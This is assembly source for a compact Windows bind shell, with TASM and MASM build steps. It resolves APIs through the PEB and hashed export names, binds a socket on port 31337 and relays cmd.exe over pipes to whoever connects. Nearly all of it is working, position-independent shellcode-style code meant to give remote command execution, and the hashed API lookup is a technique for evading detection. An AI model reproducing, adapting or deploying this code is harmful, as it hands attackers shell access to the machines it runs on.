comment ~
	bind socket to localhost:31337 using PIPES as I/O to CMD.EXE
	
	Size -> about 371 bytes

	You can assemble with instructions below.
	Its a bit lame, but you must terminate this with CTRL-C
	
	I saw this idea first used by Dark Spyrit
	
TASM
	implib -c -i -o -f import32.lib %SYSTEMROOT%\System32\ws2_32.dll
	tasm32 /dTASM /ml bind_pipes.asm
	tlink32 /Tpe /ap /x bind_pipes,,,import32.lib

MASM
	ml /DMASM /Cp /c /coff /I c:\masm32\include bind_pipes.asm
	link /SUBSYSTEM:CONSOLE /LIBPATH:c:\masm32\lib bind_pipes.obj

	bcom@hushmail.com

~
.586
.model flat, stdcall

IFDEF MASM
include	<ws2_32.inc>
.data
pad	db	0
.code
ENDIF

IFDEF TASM
extrn	WSAStartup	:proc
.code
	ret
.data
ENDIF

HASH_CONSTANT	EQU	7

;					macro for generating 16-bit api hashes
hashapi	macro	szApi
	local	dwHash
	dwHash = 0

	forc x, <szApi>
		dwHash = dwHash + "&x"
		dwHash = (dwHash shl HASH_CONSTANT) or (dwHash shr (32-HASH_CONSTANT))
	endm
	dwHash = dwHash and 0ffffh
	dw	dwHash
endm

	assume	fs:nothing
main:
	mov	eax, end_code-BindCmd
	
	sub	esp, 200h
	push	esp
	push	02h
	call	WSAStartup
	add	esp, 200h

	call	BindCmd
;================================= all code below is independent of address

szBuffer			equ	ebp+64

pipe_out_pread		equ	ebp+60
pipe_out_pwrite		equ	ebp+56
pipe_in_pread		equ	ebp+52
pipe_in_pwrite		equ	ebp+48
pipes				equ	ebp+48

hLoadLibraryA		equ	ebp-128
hCreatePipe			equ	ebp-124
hCreateProcess		equ	ebp-120
hPeekNamedPipe		equ	ebp-116
hReadFile			equ	ebp-112
hWriteFile			equ	ebp-108
hSleep			equ	ebp-104

hsocket			equ	ebp-100
hlisten			equ	ebp-96
hbind				equ	ebp-92
haccept			equ	ebp-88
hsend				equ	ebp-84
hioctlsocket		equ	ebp-80
hrecv				equ	ebp-76

hsock				equ	ebp-52
dwBytesRead			equ	ebp-48
pinfo				equ	ebp-44

BindCmd:
	enter	256, 00h
	mov	edi, ebp
	add	ebp, 127
	inc	ebp

	mov	eax, fs:[30h]
	mov	eax, [eax + 0ch]
	mov	esi, [eax + 1ch]
	lodsd
	mov	ebx, [eax + 08h]			

	call	load_api_hashes

	hashapi <LoadLibraryA>
	hashapi <CreatePipe>
	hashapi <CreateProcessA>
	hashapi <PeekNamedPipe>
	hashapi <ReadFile>
	hashapi <WriteFile>
	hashapi <Sleep>
	
	db	"ws2_32",00h
	
	hashapi <socket>
	hashapi <listen>
	hashapi <bind>
	hashapi <accept>
	hashapi <send>
	hashapi <ioctlsocket>
	hashapi <recv>

load_api_hashes:
	push	07h			; retrieve 7 first.
	pop	ecx
get_apis_loop:
	pushad
	mov	ebp, [esp + 20h]
	movzx	eax, word ptr [ebx + 3ch]
	mov	esi, [eax + ebx + 78h]
	lea	esi, [ebx + esi + 1ch]
	lodsd
	add	eax, ebx
	push	eax
	lodsd
	lea	edi, [eax + ebx]
	lodsd
	add	eax, ebx
	push	eax
	xor	ecx, ecx
load_index:
	mov	esi, [edi + 4 * ecx]
	add	esi, ebx
	xor	eax, eax
	cdq
hash_export:
	lodsb
	add	edx, eax
	rol	edx, HASH_CONSTANT
	dec	eax
	jns	hash_export
	ror	edx, HASH_CONSTANT
	inc	ecx
	cmp	dx, word ptr [ebp]
	jne	load_index
	dec	ecx
	pop	eax
	pop	esi
	movzx	eax,  word ptr [eax + 2 * ecx]
	add	ebx, dword ptr [esi + 4 * eax]
	mov	[esp + 1ch], ebx
	popad
	add	dword ptr [esp], 02h
	stosd
	loop	get_apis_loop
	 
	push	dword ptr [esp]
	call	dword ptr [hLoadLibraryA]
	add	dword ptr [esp], 07h
	dec	edx
	xchg	eax, ebx
	jnz	load_api_hashes
	pop	eax

	push	ebx
	push	01h					; SOCK_STREAM
	push	02h					; AF_INET
	call	dword ptr [hsocket]
	xchg	eax, esi
		
	push	ebx					; sockaddr_in structure
	push	ebx
	push	00100007fh				; 127.0.0.1
	push	0697a0002h				; 31337,AF_INET
	mov	eax, esp

	push	10h					; sizeof(sockaddr_in)
	push	eax					; *sockaddr_in
	push	esi					; hsocket
	call	dword ptr [hbind]
	add	esp, 10h
	
	push	1					; accept 1 connect
	push	esi
	call	dword ptr [hlisten]
	
	push	ebx
	push	ebx
	push	esi
	call	dword ptr [haccept]
	mov	[hsock], eax
	
	push	01h					; bInheritHandle=TRUE
	push	ebx					; SECURITY_DESCRIPTOR=NULL
	push	0ch					; sizeof(SECURITY_ATTRIBUTES)
	mov	edi, esp

	lea	esi, [pipes]
	push	esi
	clc
create_pipes:
	pushfd
	push	ebx
	push	edi
	push	esi
	lodsd
	push	esi
	lodsd
	call	dword ptr [hCreatePipe]
	popfd
	cmc
	jc	create_pipes
	pop	ecx
	add	esp, 0ch

	push	"dmc"					; cmd.exe
	mov	edx, esp

	push	dword ptr[ecx]
	push	dword ptr[ecx]
	push	dword ptr [pipe_out_pread]
	push	ebx
	push	ebx

	inc	ah
	push	eax
	push	11
	pop	ecx
push_stinfo:
	push	ebx
	loop	push_stinfo
	mov	eax, esp

	lea	ecx, [pinfo]
	push	ecx

	push	eax
	push	ebx
	push	ebx
	push	ebx
	push	01h
	push	ebx
	push	ebx
	push	edx
	push	ebx
	call	dword ptr [hCreateProcess]
	add	esp, 48h
cmd_loop:
	push	ebx
	push	ebx
	lea	esi, [dwBytesRead]
	push	esi
	push	64
	lea	edi, [szBuffer]
	push	edi
	push	dword ptr[pipe_in_pread]
	call	dword ptr [hPeekNamedPipe]

	mov	ecx, [esi]				; check for any data from cmd.exe
	jecxz	cmd_get_user_input

	push	ebx
	push	ecx
	push	edi
	push	dword ptr [hsock]
	;----------------------	
	push	ebx				
	push	esi				
	push	ecx				
	push	edi				
	push	dword ptr[pipe_in_pread]
	call	dword ptr [hReadFile]
	;-----------------------------
	call	dword ptr [hsend]
cmd_get_user_input:
	push	esi					; variable for data size
	push	4004667Fh				; FIONREAD
	push	dword ptr[hsock]
	call	dword ptr [hioctlsocket]

	mov	ecx, [esi]
	jecxz	cmd_sleep

	push	ebx					; 0
	push	esi					; variable for data written
	push	ecx					; length of data
	push	edi					; address of data
	push	dword ptr[pipe_out_pwrite]
	;-------------------------------
	push	ebx
	push	ecx					; length
	push	edi					; buffer
	push	dword ptr[hsock]
	call	dword ptr [hrecv]
	;-------------------------------
	call	dword ptr [hWriteFile]
cmd_sleep:
	push	10
	call	dword ptr [hSleep]		; sleep for while, to avoid thrashing
	jmp	cmd_loop
end_code:

end	main